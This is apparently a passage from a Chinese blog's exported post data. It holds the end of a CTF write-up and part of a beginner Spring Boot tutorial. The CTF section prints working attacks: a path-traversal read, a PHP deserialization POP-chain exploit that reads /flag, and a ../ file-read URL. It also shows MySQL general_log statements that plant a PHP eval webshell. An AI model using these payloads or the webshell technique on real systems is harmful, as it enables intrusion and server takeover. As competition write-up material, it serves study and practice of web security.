Ok(NamedFile::open(path)?)\n&#125;\n\n#[get(\"/\")]\nasync fn hello() -> impl Responder &#123;\n    HttpResponse::Ok().body(\"Hello world!\")\n&#125;\n\n#[get(\"/&#123;name&#125;\")]\nasync fn name(path: web::Path&lt;(String)>) -> Result&lt;String> &#123;\n    let name = path.into_inner();\n    Ok(format!(\"Welcome &#123;&#125;!\", name))\n&#125;\n\n\n#[actix_web::main]\nasync fn main() -> std::io::Result&lt;()> &#123;\n    HttpServer::new(|| &#123;\n        App::new()\n            .service(hello)\n            .service(name)\n            .route(\"/&#123;filename:.*&#125;\", web::get().to(index))\n    &#125;)\n        .bind((\"0.0.0.0\", 8000))?\n        .run()\n        .await\n&#125;\n\n看到这里\nOk(NamedFile::open(path)?)\n\n可以发现对文件进行了读取，题目提示了flag在work目录，Vue的Work目录就是当前目录，所以可以直接读取flag,payload如下\nxxx/./flag\n\n第一届陕西大学生比赛ezpop源码如下\n&lt;?php\nhighlight_file(__FILE__);\n\nclass night\n&#123;\n    public $night;\n\n    public function __destruct()&#123;\n        echo $this->night . '哒咩哟';\n    &#125;\n&#125;\n\nclass day\n&#123;\n    public $day;\n\n    public function __toString()&#123;\n        echo $this->day->go();\n    &#125;\n\n    public function __call($a, $b)&#123;\n        echo $this->day->getFlag();\n    &#125;\n&#125;\n\n\nclass light\n&#123;\n    public $light;\n\n    public function __invoke()&#123;\n        echo $this->light->d();\n    &#125;\n&#125;\n\nclass dark\n&#123;\n    public $dark;\n\n    public function go()&#123;\n        ($this->dark)();\n    &#125;\n\n    public function getFlag()&#123;\n        include(hacked($this->dark));\n    &#125;\n&#125;\n\nfunction hacked($s) &#123;\n    if(substr($s, 0,1) == '/')&#123;\n        die('呆jio步');\n    &#125;\n    $s = preg_replace('/\\.\\.*/', '.', $s);\n    $s = urldecode($s);\n    $s = htmlentities($s, ENT_QUOTES, 'UTF-8');\n    return strip_tags($s);\n&#125;\n\n$un = unserialize($_POST['快给我传参pop']); // \n\nthrow new Exception('seino');\n\n这里看到throw new Exception(&#39;seino&#39;);，明显考察的是PHP的GC垃圾回收机制，写完序列化内容后，添加上数组另第二个值为空，而后再修改payload最后的1位为0即可，但这里最坑的点在于，这个题目的POST传参的值带了不可见字符，原题是这样的\n\n让人误以为传参点是pop，所以看好参数名还是很重要的，在这里看了好久才看出来。\n最终Exp\n&lt;?php\nhighlight_file(__FILE__);\n\nclass night\n&#123;\n    public $night;\n\n    public function __destruct()&#123;\n        echo $this->night . '哒咩哟';\n    &#125;\n&#125;\n\nclass day\n&#123;\n    public $day;\n\n    public function __toString()&#123;\n        echo $this->day->go();\n    &#125;\n\n    public function __call($a, $b)&#123;\n        echo $this->day->getFlag();\n    &#125;\n&#125;\n\n\nclass light\n&#123;\n    public $light;\n\n    public function __invoke()&#123;\n        echo $this->light->d();\n    &#125;\n&#125;\n\nclass dark\n&#123;\n    public $dark;\n\n    public function go()&#123;\n        ($this->dark)();\n    &#125;\n\n    public function getFlag()&#123;\n       \n        include(hacked($this->dark));\n    &#125;\n&#125;\n\nfunction hacked($s) &#123;\n    if(substr($s, 0,1) == '/')&#123;\n        die('呆jio步');\n    &#125;\n    $s = preg_replace('/\\.\\.*/', '.', $s);\n    $s = urldecode($s);\n    $s = htmlentities($s, ENT_QUOTES, 'UTF-8');\n    return strip_tags($s);\n&#125;\n\n\n$pop = new night();\n$pop->night = new day();\n$pop->night->day = new dark();\n$pop->night->day->dark=new light();\n$pop->night->day->dark->light= new day();\n$pop->night->day->dark->light->day=new dark();\n$pop->night->day->dark->light->day->dark=\"php://filter/read=convert.base64-encode/resource=file:///flag\";\n$pop1 =array($pop,null);\necho serialize($pop1);\n\n生成的payload为\n‮⁦快给我传参⁩⁦pop=a:2:&#123;i:0;O:5:\"night\":1:&#123;s:5:\"night\";O:3:\"day\":1:&#123;s:3:\"day\";O:4:\"dark\":1:&#123;s:4:\"dark\";O:5:\"light\":1:&#123;s:5:\"light\";O:3:\"day\":1:&#123;s:3:\"day\";O:4:\"dark\":1:&#123;s:4:\"dark\";s:61:\"php://filter/read=convert.base64-encode/resource=file:///flag\";&#125;&#125;&#125;&#125;&#125;&#125;i:1;N;&#125;\n\n这里需要将最后的i:1改为i:0，不理解的可以看我这篇文章https://quan9i.top/post/%E6%B5%85%E6%9E%90%20PHP%20GC%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/\n而后传值即可\n\n安洵杯CarelessPy题目中含有注释\n\n存在任意文件读取漏洞，在download处，但过滤了app.py、flag、proc等关键词\n抓到的包JWTheader部分是islogin：\n通过eval路由可以查看目录，这里能看到pyc文件\n接下来用刚刚的任意文件读取读取文件，payload如下\nhttp://47.108.165.60:42113/download\n?file=../../../app/__pycache__/part.cpython-311.pyc\n\n而后进行pyc反编译\n\n得到secret_key o2takuXX_donot_like_ntr 试试session伪造\nSession伪造成功，提示\n\n访问对应URL\n\n打一个xxe就行\n\nConfronting robot输入单引号\n\n发现报错，明显SQL注入\n这里通过sqlmap可在name表得到如下信息\nsecret is in /sEcR@t_n@Bodyknow.php\n\n当时访问后发现扔是一个界面，疑似存在SQL注入，当时没有再进行深入。\n实际上，此时直接用慢日志查询写Shell即可实现Getshell，具体语句如下\nshow variables like 'general_log';\nset global general_log=on;\nset global general_log_file='/var/www/html/sEcR@t_n@Bodyknow.php';\nselect \"&lt;?php @eval($_POST[1]);?>\";\n\n","slug":"部分CTF题目复现","date":"2023-04-20T07:02:30.000Z","categories_index":"WEB知识","tags_index":"CTF","author_index":"quan9i"},{"id":"ae530cf0e291102adbee6321d7a17ef6","title":"Spring boot 从0到0.1 part(1)","content":"Day 01第一个Spring boot项目首先新建项目，选择Spring Initializr\n\n随便填一下包名，选版本号后点击Next即可\n\n开启Spring Web服务。\n这里需要注意一点，去修改Spring boot版本，使其小于3.0.5(如果其他配置与我前面配置一致的话)，否则会报错\n\n运行后发现Tomcat服务开启于8080端口，访问之\n\n这是因为并没有写什么东西，接下来在这个主java文件新建文件夹controller，并创建文件HelloController，写一个hello路由，内容如下\npackage com.example.qwq.controller;\n\nimport org.springframework.web.bind.annotation.RequestMapping;\nimport org.springframework.web.bind.annotation.RestController;\n\n@RestController\npublic class HelloController &#123;\n        @RequestMapping(\"/hello\") \n        public String hello()&#123;\n            return \"Hello, Spring Boot !\";\n        &#125;\n&#125;\n\n\n启动项目，访问**/hello**路由\n\n简化配置在application.properties中写入内容如下\nserver.port=8888\n\n此时重新运行项目，就会从8080端口变为8888端口\n\n自动配置原理参考https://www.yuque.com/atguigu/springboot/qb7hy2即可\nDay02属性赋值小trick分享:Alt+Insert可以快捷写出一些方法\n常规首先写Dog.java\npackage com.qwq.cs;\n\nimport org.springframework.beans.factory.annotation.Value;\nimport org.springframework.stereotype.Component;\n\n@Component\npublic class Dog &#123;\n    @Value(\"柯基\")\n    private String name;\n    @Value(\"3\")\n    private Integer age;\n    public Dog()&#123;\n    &#125;\n    public Dog(String name, Integer age) &#123;\n        this.name = name;\n        this.age = age;\n    &#125;\n\n    public String getName() &#123;\n        return name;\n    &#125;\n\n    public void setName(String name) &#123;\n        this.name = name;\n    &#125;\n\n    public Integer getAge() &#123;\n        return age;\n    &#125;\n\n    public void setAge(Integer age) &#123;\n        this.age = age;\n    &#125;\n\n    @Override\n    public String toString() &#123;\n        return \"dog&#123;\" +\n                \"name='\" + name + '\\'' +\n                \", age=\" + age +\n                '&#125;';\n    &#125;\n&#125;\n\n\n我们这里通过**@Value(‘xxx’)对实例化的类进行赋值，接下来去Test**文件夹下的java文件中进行调用\nimport com.qwq.cs.Dog;\nimport org.junit.jupiter.api.Test;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.boot.test.context.SpringBootTest;\n\n@SpringBootTest\nclass QwqApplicationTests &#123;\n    @Autowired\n    private Dog dog;\n    @Test\n    void contextLoads() &#123;\n        System.out.println(dog);\n    &#125;\n\n&#125;\n\n\n方法二（application.yaml）我们这里在cs文件夹下再写一个Person.java文件\npackage com.qwq.cs;\n\nimport com.sun.org.apache.xpath.internal.operations.Bool;\nimport org.springframework.stereotype.Component;\n\nimport java.util.Date;\nimport java.util.List;\nimport java.util.Map;\nimport java.util.Objects;\n\n@Component\npublic class Person &#123;\n    private  String name;\n    private  Integer age;\n    private  Boolean happy;\n    private Date birth;\n    private Map&lt;String, Object> maps;\n    private List&lt;Object> lists;\n    private Dog dog;\n\n    public Person()&#123;\n    &#125;\n\n    public Person(String name, Integer age, Boolean happy, Date birth, Map&lt;String, Object> maps, List&lt;Object> lists, Dog dog) &#123;\n        this.name = name;\n        this.age = age;\n        this.happy = happy;\n        this.birth = birth;\n        this.maps = maps;\n        this.lists = lists;\n        this.dog = dog;\n    &#125;\n\n    public String getName() &#123;\n        return name;\n    &#125;\n\n    public void setName(String name) &#123;\n        this.name = name;\n    &#125;\n\n    public Integer getAge() &#123;\n        return age;\n    &#125;\n\n    public void setAge(Integer age) &#123;\n        this.age = age;\n    &#125;\n\n    public Boolean getHappy() &#123;\n        return happy;\n    &#125;\n\n    public void setHappy(Boolean happy) &#123;\n        this.happy = happy;\n    &#125;\n\n    public Date getBirth() &#123;\n        return birth;\n    &#125;\n\n    public void setBirth(Date birth) &#123;\n        this.birth = birth;\n    &#125;\n\n    public Map&lt;String, Object> getMaps() &#123;\n        return maps;\n    &#125;\n\n    public void setMaps(Map&lt;String, Object> maps) &#123;\n        this.maps = maps;\n    &#125;\n\n    public List&lt;Object> getLists() &#123;\n        return lists;\n    &#125;\n\n    public void setLists(List&lt;Object> lists) &#123;\n        this.lists = lists;\n    &#125;\n\n    public Dog getDog() &#123;\n        return dog;\n    &#125;\n\n    public void setDog(Dog dog) &#123;\n        this.dog = dog;\n    &#125;\n\n    @Override\n    public String toString() &#123;\n        return \"Person&#123;\" +\n                \"name='\" + name + '\\'' +\n                \", age=\" + age +\n                \", happy=\" + happy +\n                \", birth=\" + birth +\n                \", maps=\" + maps +\n                \", lists=\" + lists +\n                \", dog=\" + dog +\n                '&#125;';\n    &#125;\n&#125;\n\n而后，我们在src/resources新建一个application.yaml文件，写入内容如下\nperson:\n  name: quan9i\n  age: 19\n  happy: true\n  birth: 2023/4/17\n  maps: &#123;k1: v1,k2: v2&#125;\n  list:\n    -code\n    -guitar\n    -girl\n  dog:\n    name: 柯基\n    age: 3\n\n而后我们在Person.java中前面加上一句话\n@ConfigurationProperties(prefix = \"person\")\n//这个将配置文件中的值与java文件进行绑定，可以给其赋值\n\n这个的话就是将值写入到person类中\n\n此时会爆红，但不影响使用，接下来去Test下的Java文件中进行调用，只需把Dog类换成Person类即可\npackage com.qwq;\n\nimport com.qwq.cs.Dog;\nimport com.qwq.cs.Person;\nimport org.junit.jupiter.api.Test;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.boot.test.context.SpringBootTest;\n\n@SpringBootTest\nclass QwqApplicationTests &#123;\n    @Autowired\n    private Person person;\n    @Test\n    void contextLoads() &#123;\n        System.out.println(person);\n    &#125;\n\n&#125;\n\n这里还需要做一点，就是设置文件编码格式为UTF-8，否则就会报错(找了半小时，nnd)\n\n而后运行即可\n\n方法三（加载特定配置文件）//加载特定配置文件\n@PropertySource(value = \"classpath:quan9i.properties\")\npublic class Person &#123;\n    @Value(\"$&#123;name&#125;\") //SPEL表达式取出配置文件值\n\njava文件整体内容如下\nimport com.sun.org.apache.xpath.internal.operations.Bool;\nimport org.springframework.beans.factory.annotation.Value;\nimport org.springframework.boot.context.properties.ConfigurationProperties;\nimport org.springframework.context.annotation.PropertySource;\nimport org.springframework.stereotype.Component;\n\nimport java.util.Date;\nimport java.util.List;\nimport java.util.Map;\nimport java.util.Objects;\n\n@Component\n//@ConfigurationProperties(prefix = \"person\")\n//加载指定配置文件\n@PropertySource(value = \"classpath:quan9i.properties\")\npublic class Person &#123;\n    @Value(\"$&#123;name&#125;\")\n    private  String name;\n    private  Integer age;\n    private  Boolean happy;\n    private Date birth;\n    private Map&lt;String, Object> maps;\n    private List&lt;Object> lists;\n    private Dog dog;\n\n    public Person()&#123;\n\n    &#125;\n\n    public Person(String name, Integer age, Boolean happy, Date birth, Map&lt;String, Object> maps, List&lt;Object> lists, Dog dog) &#123;\n        this.name = name;\n        this.age = age;\n        this.happy = happy;\n        this.birth = birth;\n        this.maps = maps;\n        this.lists = lists;\n        this.dog = dog;\n    &#125;\n\n    @Override\n    public String toString() &#123;\n        return \"Person&#123;\" +\n                \"name='\" + name + '\\'' +\n                \", age=\" + age +\n                \", happy=\" + happy +\n                \", birth=\" + birth +\n                \", maps=\" + maps +\n                \", lists=\" + lists +\n                \", dog=\" + dog +\n                '&#125;';\n    &#125;\n\n    public String getName() &#123;\n        return name;\n    &#125;\n\n    public void setName(String name) &#123;\n        this.name = name;\n    &#125;\n\n    public Integer getAge() &#123;\n        return age;\n    &#125;\n\n    public void setAge(Integer age) &#123;\n        this.age = age;\n    &#125;\n\n    public Boolean getHappy() &#123;\n        return happy;\n    &#125;\n\n    public void setHappy(Boolean happy) &#123;\n        this.happy = happy;\n    &#125;\n\n    public Date getBirth() &#123;\n        return birth;\n    &#125;\n\n    public void setBirth(Date birth) &#123;\n        this.birth = birth;\n    &#125;\n\n    public Map&lt;String, Object> getMaps() &#123;\n        return maps;\n    &#125;\n\n    public void setMaps(Map&lt;String, Object> maps) &#123;\n        this.maps = maps;\n    &#125;\n\n    public List&lt;Object> getLists() &#123;\n        return lists;\n    &#125;\n\n    public void setLists(List&lt;Object> lists) &#123;\n        this.lists = lists;\n    &#125;\n\n    public Dog getDog() &#123;\n        return dog;\n    &#125;\n\n    public void setDog(Dog dog) &#123;\n        this.dog = dog;\n    &#125;\n&#125;\n\n\n静态资源导入静态资源目录只要静态资源放在类路径下： called /static (or /public or /resources or /META-INF/resources\n访问 ： 当前项目根路径/ + 静态资源名 \n寻找方法如下：\n双击Shift搜MVC，找到这个文件\n\n而后找到自动配置类中的添加资源方法\n\nwebjar自动映射 /webjars/**\n接下来访问\nhttps://www.webjars.org/\n将Maven方式的jquery复制下来，具体内容如下\n&lt;dependency>\n            &lt;groupId>org.webjars&lt;/groupId>\n            &lt;artifactId>jquery&lt;/artifactId>\n            &lt;version>3.4.1&lt;/version>\n        &lt;/dependency>\n\n然后粘贴到Pom.xml中，接下来可以发现自动加载Maven后，成功导入\n\n访问地址：http://localhost:8080/webjars/jquery/3.4.1/jquery.js   后面地址要按照依赖里面的包路径\n接下来看代码\n\n发现这还有一个静态定义方法，跟进它这个**getStaticPathPattern()**方法进行查看\n\n\n发现是根目录下的全部，然后接下来再回MVC这个文件中找一些其他的，这里发现WebProperties\n\n\n发现三个其他目录，这里的话也就可以理解大致含义了，就是说在resources下新建resources、static、public目录，其下面的内容都可被直接访问\n\n这里随便写一个1.js，然后访问http://127.0.0.1:8888/1.js\n\n他们的优先级顺序是resources&gt;static(默认)&gt;public\n首页相关从WEBMVC文件中查看有关首页的\n\n这里发现*getWelcomepage()*有关首页，然后它引用了getIndexHtml函数，然后这个函数用了getResource函数，这个函数引用了index.html，那我们接下来在映射对应的目录下新建一个index.html文件，按理说访问首页即可加载，接下来进行尝试\n\n\n对于图标的话，直接在static文件下放置ico图标即可\n\n这里的话接着说首页\n首页的话它是需要用一个模板引擎进行数据交互的，这里用的是thymeleaf模板引擎，双击shift搜索Thymelaf\n\n这里可以看到它是对templates文件夹下的所有.html后缀的文件使用了这个模板，接下来进行尝试\n尝试之前首先在pom.xml中添加jar包\n&lt;dependency>\n    &lt;groupId>org.thymeleaf&lt;/groupId>\n    &lt;artifactId>thymeleaf-spring5&lt;/artifactId>\n&lt;/dependency>\n&lt;dependency>\n    &lt;groupId>org.thymeleaf.extras&lt;/groupId>\n    &lt;artifactId>thymeleaf-extras-java8time&lt;/artifactId>\n&lt;/dependency>\n\n然后接下来在这个templates目录下写个文件命名为test.html。\n然后我们想要主java文件去实现跳转到这个html界面，这个时候就需要用到一个controller，其实就是新建一个Controller文件夹，在里面写内容即可实现跳转。具体代码为\nimport org.springframework.stereotype.Controller;\nimport org.springframework.web.bind.annotation.GetMapping;\nimport org.springframework.web.bind.annotation.RequestMapping;\nimport org.springframework.web.bind.annotation.ResponseBody;\n\n//在templates目录下的所有文件，只能通过controller来跳转!\n//这个需要模板引擎的支持，这里使用的是thymeleaf\n@Controller\npublic class IndexController &#123;\n    @RequestMapping(\"/test\")\n    public String test() &#123;\n        return \"test\";\n    &#125;\n&#125;\n\n\n\n他这里的话，是我们访问test，然后它会返回test，然后它会自动去拼接.html后缀，然后去templates下找是否存在此文件，如果存在，此时就会直接加载\n\n接下来说一下thy这个模板的引用，它需要在我们的html文件头部首先声明\n&lt;html lang=\"en\" xmlns:th=\"http://www.thymeleaf.org\">\n\n而后，对于一些值的引用，比如我们这里的java文件写入一个msg参数\npackage com.qwq.Controller;\n\nimport org.springframework.stereotype.Controller;\nimport org.springframework.ui.Model;\nimport org.springframework.web.bind.annotation.RequestMapping;\n\n//在templates目录下的所有文件，只能通过controller来跳转!\n//这个需要模板引擎的支持，这里使用的是thymeleaf\n@Controller\npublic class IndexController &#123;\n    @RequestMapping(\"/test\")\n    public String test(Model model) &#123;\n        model.addAttribute(\"msg\",\"hello,Springboot\");\n        return \"test\";\n    &#125;\n&#125;\n\n想调用的话，此时需要在html中声明th:text，具体代码如下\n&lt;!DOCTYPE html>\n&lt;html lang=\"en\" xmlns:th=\"http://www.thymeleaf.org\">\n&lt;head>\n    &lt;meta charset=\"UTF-8\">\n    &lt;title>Title&lt;/title>\n&lt;/head>\n&lt;body>\n&lt;h1 th:text=\"$&#123;msg&#125;\">&lt;/h1>\n&lt;/body>\n&lt;/html>\n\n实现效果\n\nthymeleaf部分语法th:text 对参数值进行获取\nth:utext 如果参数中含有&lt;h1>&lt;/h1>这种标签，会进行解析\nth:each 遍历输出\n\n\n\n\n表达式名字\n语法\n用途\n\n\n\n变量取值\n${…}\n获取请求域、session域、对象等值\n\n\n选择变量\n*{…}\n获取上下文对象值\n\n\n消息\n#{…}\n获取国际化等值\n\n\n链接\n@{…}\n生成链接\n\n\n片段表达式\n~{…}\njsp:include 作用，引入公共页面片段\n\n\n条件运算\nIf-then: (if) ? (then)\nIf-then-else: (if) ? (then) : (else)\nDefault: (value) ?: (defaultvalue) \n\n\n\n示例：java文件代码\nimport org.springframework.stereotype.Controller;\nimport org.springframework.ui.Model;\nimport org.springframework.web.bind.annotation.RequestMapping;\n\nimport java.util.Arrays;\n\n//在templates目录下的所有文件，只能通过controller来跳转!\n//这个需要模板引擎的支持，这里使用的是thymeleaf\n@Controller\npublic class IndexController &#123;\n    @RequestMapping(\"/test\")\n    public String test(Model model) &#123;\n        model.addAttribute(\"msg\",\"hello,Springboot\");\n        model.addAttribute(\"users\", Arrays.asList(\"quan9i\",\"is\",\"the\",\"best\"));\n        return \"test\";\n    &#125;\n&#125;\n\n主要是这一行\nmodel.addAttribute(\"users\", Arrays.asList(\"quan9i\",\"is\",\"the\",\"best\"));\n\n然后接下来看html，其内容如下\n&lt;!DOCTYPE html>\n&lt;html lang=\"en\" xmlns:th=\"http://www.thymeleaf.org\">\n&lt;head>\n    &lt;meta charset=\"UTF-8\">\n    &lt;title>Title&lt;/title>\n&lt;/head>\n&lt;body>\n&lt;div th:each=\"user:$&#123;users&#125;\" th:text=\"$&#123;user&#125;\">&lt;/div>\n&lt;/body>\n&lt;/html>\n\nth:each中用user挨个获取了users的参数名，然后呢，我们这里用th:text对它再进行挨个的值的输出，实现效果如下。\n\n也可以这么写\n&lt;div th:each=\"user:$&#123;users&#125;\" >[[$&#123;user&#125;]]&lt;/div>\n\nMVC相关装配原理查看Contentxx\n\n在这个Contentxxx中发现ViewResolver解析器，跟进\npublic interface ViewResolver 实现了视图解析器的类，我们就可以认为是视图解析器，接下来继续跟进它内部的这个函数，我们将它这个函数名进行复制，然后看Contentxx中哪里调用了这个\n\n可以发现它这里是当内容非空时，getCandidateViews函数先对其进行处理，而后用getBestView函数处理，接下来首先跟进一下第一个函数\n\n它这里的话其实就是遍历了所有的视图解析器，遍历完后封装为对象，添加到视图，而后返回视图。它这里最后的获取是需要通过bean来进行获取的\n所以我们最后的示例代码如下\nimport org.springframework.context.annotation.Bean;\nimport org.springframework.context.annotation.Configuration;\nimport org.springframework.web.servlet.View;\nimport org.springframework.web.servlet.ViewResolver;\nimport org.springframework.web.servlet.config.annotation.WebMvcConfigurer;\n\nimport java.util.Locale;\n\n//想添加自定义功能，只需要写一个组件，而后交给Springboot，即可自动实现\n//扩展Spring MVC\n@Configuration\npublic class MyMvcConfig implements WebMvcConfigurer &#123;\n\n    //public interface ViewResolver 实现了视图解析器的类，我们就可以认为是视图解析器\n    @Bean\n    public ViewResolver myViewResolver()&#123;\n        return new MyViewResolver();\n    &#125;\n    public static class MyViewResolver implements ViewResolver&#123;\n        @Override\n        public View resolveViewName(String viewName, Locale locale) throws Exception&#123;\n            return null;\n        &#125;\n    &#125;\n&#125;\n\n小扩展实现视图跳转，示例代码如下\npublic class MyMvcConfig implements WebMvcConfigurer &#123;\n\n    //视图跳转\n    @Override\n    public void addViewControllers(ViewControllerRegistry registry)&#123;\n        registry.addViewController(\"/quan\").setViewName(\"/test\");\n    &#125;\n&#125;\n\n这里的话，**/test**会直接匹配到我们的那个templates下的test.html文件，我们这里注册了一个视图，当访问/quan时，就会跳转到对应html界面\n\n这里因为我们没有设置参数，所以为空白\n还有一个@EnableWebMvc，这个轻易不能开启，他会使得默认的mvc配置失效。\nDay03(员工管理系统)准备工作后续用到的index.html及其他代码可在https://getbootstrap.com/docs/4.0/examples/中进行获取\n先写一下部门的基本参数（部门ID及部门昵称）\n#Department.java\npublic class Department &#123;\n    private Integer id;\n    private String departmentName;\n&#125;\n\n配置一下pom.xml,导入lombok\n&lt;dependency>\n            &lt;groupId>org.projectlombok&lt;/groupId>\n            &lt;artifactId>lombok&lt;/artifactId>\n&lt;/dependency>\n\n接下来放入java文件中，同时我们还要添加两个，一个是有参导入，一个是无参导入，代码如下\nimport lombok.AllArgsConstructor;\nimport lombok.Data;\nimport lombok.NoArgsConstructor;\n\nimport javax.annotation.sql.DataSourceDefinition;\n\n//部门表\n@Data\n@AllArgsConstructor\n@NoArgsConstructor\npublic class Department &#123;\n    private Integer id;\n    private String departmentName;\n&#125;\n\n\n部门表写好后，此时我们还需要写一个员工表，此时新建一个文件，命名为Employee.java文件，写一些基础的参数\n#Employee.java\nimport lombok.AllArgsConstructor;\nimport lombok.Data;\nimport lombok.NoArgsConstructor;\nimport java.util.Date;\n\n//员工表\n@Data\n@NoArgsConstructor\n@AllArgsConstructor\npublic class Employee &#123;\n    private Integer id;\n    private String lastName;\n    private String email;\n    private Integer gender; //0代表女，1代表男\n\n    private Department department;\n    private Date bitrh;\n&#125;\n\n接下来需要新建一个Dao文件夹，然后这个我之前不太了解，百度了一下\n在java学习中，特别是接触到web开发的时候，我们会经常遇到DAO这个家伙。中文名：数据访问对象，英文名：Data Access Object，我们简称DAO。在这一类的java后缀文件中，主要是用来访问数据库的，从数据库中选取需要分析或是处理的数据\n\n然后接下来在它这个目录夹下新建文件命名为DepartmentDao.java，内容如下\nimport com.qwq.pojo.Department;\n\nimport java.util.Collection;\nimport java.util.HashMap;\nimport java.util.Map;\n\n//部门dao\npublic class DepartmentDao &#123;\n    //模拟数据库中的数据\n    private static Map&lt;Integer, Department> departments = null;\n\n    static &#123;\n        departments = new HashMap&lt;Integer, Department>();//创建一个部门表\n        departments.put(101,new Department(101,\"教学部\"));\n        departments.put(102,new Department(102,\"市场部\"));\n        departments.put(103,new Department(103,\"教研部\"));\n        departments.put(104,new Department(104,\"运营部\"));\n        departments.put(105,new Department(105,\"后勤部\"));\n    &#125;\n\n    //查询部门所有信息\n    public Collection&lt;Department> getDepartments()&#123;\n        return  departments.values();\n    &#125;\n    //查询部门所有id\n    public Department getDepartmentById(Integer id)&#123;\n        return  departments.get(id);\n    &#125;\n\n\n接下来部门的写好了，还需要写一个员工的，所以再新建一个Employee.java，内容如下\n//员工Dao\n@Repository\npublic class EmployeeDao &#123;\n\n    //模拟数据库数据\n    private  static Map&lt;Integer, Employee> employees = null;\n    //员工所属部门\n    private DepartmentDao departmentDao;\n\n    static&#123;\n        employees = new HashMap&lt;Integer, Employee>();//创建一个部门表\n\n        employees.put(1001,new Employee(1001,\"AA\",\"A123@qq.com\",0,new Department(1001,\"教学部\")));\n        employees.put(1001,new Employee(1002,\"AA\",\"B123@qq.com\",1,new Department(1001,\"市场部\")));\n        employees.put(1001,new Employee(1003,\"AA\",\"C123@qq.com\",0,new Department(1001,\"教研部\")));\n        employees.put(1001,new Employee(1004,\"AA\",\"D123@qq.com\",1,new Department(1001,\"运营部\")));\n        employees.put(1001,new Employee(1005,\"AA\",\"E123@qq.com\",0,new Department(1001,\"后勤部\")));\n    &#125;\n\n&#125;\n\n这里考虑到Date不能直接写死，所以这里采用直接按时间生成的方式，修改Employee.java内容如下\nimport lombok.Data;\nimport lombok.NoArgsConstructor;\nimport java.util.Date;\n\n//员工表\n@Data\n@NoArgsConstructor\npublic class Employee &#123;\n    private Integer id;\n    private String lastName;\n    private String email;\n    private Integer gender; //0代表女，1代表男\n\n    private Department department;\n    private Date bitrh;\n\n    public Employee(Integer id, String lastName, String email, Integer gender, Department department) &#123;\n        this.id = id;\n        this.lastName = lastName;\n        this.email = email;\n        this.gender = gender;\n        this.department = department;\n        this.bitrh = new Date();\n        //默认日期\n    &#125;\n&#125;\n\n然后此时就可以写入用户信息了，同时实现增删改查功能，EmployeeDao.java内容如下\n//员工Dao\n@Repository\npublic class EmployeeDao &#123;\n\n    //模拟数据库数据\n    private  static Map&lt;Integer, Employee> employees = null;\n    //员工所属部门\n    private DepartmentDao departmentDao;\n\n    static&#123;\n        employees = new HashMap&lt;Integer, Employee>();//创建一个部门表\n\n        employees.put(1001,new Employee(1001,\"AA\",\"A123@qq.com\",0,new Department(1001,\"教学部\")));\n        employees.put(1001,new Employee(1002,\"AA\",\"B123@qq.com\",1,new Department(1001,\"市场部\")));\n        employees.put(1001,new Employee(1003,\"AA\",\"C123@qq.com\",0,new Department(1001,\"教研部\")));\n        employees.put(1001,new Employee(1004,\"AA\",\"D123@qq.com\",1,new Department(1001,\"运营部\")));\n        employees.put(1001,new Employee(1005,\"AA\",\"E123@qq.com\",0,new Department(1001,\"后勤部\")));\n    &#125;\n\n    //主键自增!\n    private static Integer initId =1006;\n    //添加一个员工\n    public void save(Employee employee) &#123;\n        if (employee.getId() == null)\n            employee.setId(initId++);\n        employee.setDepartment(departmentDao.getDepartmentById(employee.getDepartment().getId()));\n\n        employees.put(employee.getId(), employee);\n    &#125;\n        //查询员工信息\n        public Collection&lt;Employee> getAll() &#123;\n            return employees.values();\n        &#125;\n        //通过id查询员工\n        public Employee getEmployeeById(Integer id)&#123;\n            return employees.get(id);\n        &#125;\n        //删除员工通过id\n        public void delete(Integer id)&#123;\n            employees.remove(id);\n        &#125;\n    &#125;\n\n\n首页实现这里可以采用在时java文件中进行一个跳转的，当访问/或/index.html时强制跳转到index，具体代码如下(但此方法并不推荐)\nimport org.springframework.stereotype.Controller;\nimport org.springframework.web.bind.annotation.RequestMapping;\n\n@Controller\npublic class IndexController &#123;\n    @RequestMapping(&#123;\"/\",\"/index.html\"&#125;)\n    public String index()&#123;\n        return \"index\";\n    &#125;\n&#125;\n\n此时开启服务，访问\n\n还有一种方法，就是我们可以通过写控制器来实现，具体步骤如下，新建MyMvcConfig文件，具体内容如下\nimport org.springframework.context.annotation.Configuration;\nimport org.springframework.web.servlet.config.annotation.ViewControllerRegistry;\nimport org.springframework.web.servlet.config.annotation.WebMvcConfigurer;\n\n@Configuration\npublic class MyMvcConfig implements WebMvcConfigurer &#123;\n\n    @Override\n    public void addViewControllers(ViewControllerRegistry registry)&#123;\n        registry.addViewController(\"/\").setViewName(\"index\");\n        registry.addViewController(\"/index.html\").setViewName(\"index\");\n    &#125;\n&#125;\n\n\n\n\n此时再开启\n\n同样也是可以访问到的，然后就是说一下静态资源的问题\n在这里的话，所有的页面中的静态资源都需要用thymeleaf，\n比如，在html文件开头，我们需要加上\n&lt;html lang=\"en\" xmlns:th=\"http://www.thymeleaf.org\">\n\n在引用链接时，我们需要修改链接，具体如下\n修改前:    &lt;link rel=\"stylesheet\" href=\"./css/style.css\">\n修改后:    &lt;link rel=\"stylesheet\" th:href=@&#123;/css/style.css&#125;>\n\n\n\n国际化什么是国际化呢，它在这里被我们称为i18n，i18n实际上是国际化的英文缩写，中间有18个字符，故称为i18n，同类的还有K8s。国际化其实就是多语言模式，比如我们常见的网站都支持两种语言，一种是汉语，一种是英语。\n接下来说一下具体操作，首先在根目录下新建文件夹，命名为i18n，此时新建文件，命名为login_zh_CN.properties，按理说可以实现自动装配\n\n如上图所示，不过我这里的话没实现，我是手动引入的，接下来继续看，添加英文模式,首先右键\n\n接下来点击加号，输入en_US\n\n而后点击OK，即可看见自动加入了英文,然后引入这个的话，是需要在application.yaml添加message的，具体内容如下\nserver.port: 8888\n#清除缓存\nspring:\n  thymeleaf:\n    cache: false\n  #配置信息\n  messages:\n    basename: i18n.login\n\n而后我们在login.properties中可以实时更改三个文件\n\n我们配置后在index.html中更改如下\n\n&lt;!doctype html>\n&lt;html lang=\"en\" xmlns:th=\"http://www.thymeleaf.org\">\n&lt;head>\n    &lt;meta charset=\"utf-8\">\n    &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1, shrink-to-fit=no\">\n    &lt;meta name=\"description\" content=\"\">\n    &lt;meta name=\"author\" content=\"\">\n    &lt;link rel=\"icon\" th:href=\"@&#123;/favicon.ico&#125;\">\n\n    &lt;title>Signin Template for Bootstrap&lt;/title>\n\n    